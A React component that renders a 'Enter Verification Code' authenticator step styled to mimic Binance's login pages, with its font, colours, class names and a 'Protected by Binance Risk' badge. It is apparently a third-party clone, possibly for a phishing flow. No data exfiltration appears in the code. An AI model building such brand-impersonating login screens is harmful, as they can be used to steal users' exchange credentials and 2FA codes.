
import { FC, useState } from "react";
import { Button } from "@/components/ui/button";
import { Loader, Lock } from "lucide-react";

interface VerificationStepProps {
  verificationCode: string;
  isLoading: boolean;
  onSubmit: (code: string) => void;
  onBack: () => void;
}

export const VerificationStep: FC<VerificationStepProps> = ({ 
  verificationCode: initialCode, 
  isLoading, 
  onSubmit, 
  onBack 
}) => {
  const [code, setCode] = useState(initialCode);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.trim()) {
      onSubmit(code);
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setCode(text);
    } catch (err) {
      console.error('Failed to read clipboard contents: ', err);
    }
  };

  return (
    <>
      {/* Header */}
      <div className="mb-8">
        <div 
          className="card-page-title !mb-[0px]" 
          role="heading" 
          aria-level={1}
          style={{ 
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "24px",
            fontWeight: "600",
            lineHeight: "32px"
          }}
        >
          Enter Verification Code
        </div>
        <div 
          className="mt-2"
          style={{ 
            color: "var(--color-TertiaryText, #848E9C)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px"
          }}
        >
          Enter the code from your Google/Binance Authenticator.
        </div>
      </div>

      {/* Verification Form */}
      <form onSubmit={handleSubmit}>
        <div className="bn-formItem mb-6">
          <label 
            className="bn-formItem-label block mb-2" 
            htmlFor="verification-input"
            style={{ 
              color: "var(--color-TertiaryText, #848E9C)",
              fontFamily: "BinanceNova, Arial, sans-serif",
              fontSize: "12px",
              fontWeight: "400",
              lineHeight: "16px"
            }}
          >
            Authenticator App
          </label>
          <div>
            <div className="css-4cffwv">
              <div 
                className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded flex items-center"
                style={{
                  backgroundColor: "var(--color-Input, #2B3139)",
                  border: "1px solid var(--color-InputLine, #474D57)"
                }}
                role="group"
              >
                <input
                  placeholder="000000"
                  type="text"
                  role="textbox"
                  aria-label="Verification code field"
                  name="verification"
                  autoFocus
                  id="verification-input"
                  autoCapitalize="off"
                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                  style={{ 
                    color: "var(--color-PrimaryText, #EAECEF)",
                    fontFamily: "BinanceNova, Arial, sans-serif",
                    fontSize: "14px",
                    fontWeight: "400",
                    lineHeight: "20px"
                  }}
                  spellCheck="false"
                  maxLength={6}
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                />
                <button
                  type="button"
                  onClick={handlePaste}
                  className="px-3 text-sm font-medium"
                  style={{
                    color: "var(--color-BtnBg, #FCD535)",
                    fontFamily: "BinanceNova, Arial, sans-serif"
                  }}
                >
                  Paste
                </button>
              </div>
            </div>
          </div>
        </div>

        <Button
          className="w-full py-3 rounded transition-colors mb-6"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "500",
            lineHeight: "20px",
            height: "48px"
          }}
          type="submit"
          disabled={isLoading || !code.trim()}
        >
          {isLoading ? (
            <Loader className="animate-spin h-4 w-4" />
          ) : (
            "Submit"
          )}
        </Button>

        {/* Protected by Binance Risk */}
        <div className="flex items-center justify-center">
          <div className="flex items-center">
            <div 
              className="w-4 h-4 mr-2 flex items-center justify-center rounded border"
              style={{ 
                backgroundColor: "var(--color-TertiaryText, #848E9C)",
                borderColor: "var(--color-TertiaryText, #848E9C)"
              }}
            >
              <Lock 
                className="w-2 h-2" 
                style={{ color: "var(--color-CardBg, #1E2329)" }}
              />
            </div>
            <span 
              className="text-sm"
              style={{ 
                color: "var(--color-TertiaryText, #848E9C)",
                fontFamily: "BinanceNova, Arial, sans-serif"
              }}
            >
              Protected by Binance Risk
            </span>
          </div>
        </div>

        <button
          type="button"
          onClick={onBack}
          className="w-full text-center text-sm mt-4"
          style={{
            color: "var(--color-TertiaryText, #848E9C)",
            fontFamily: "BinanceNova, Arial, sans-serif"
          }}
        >
          Back to password
        </button>
      </form>
    </>
  );
};
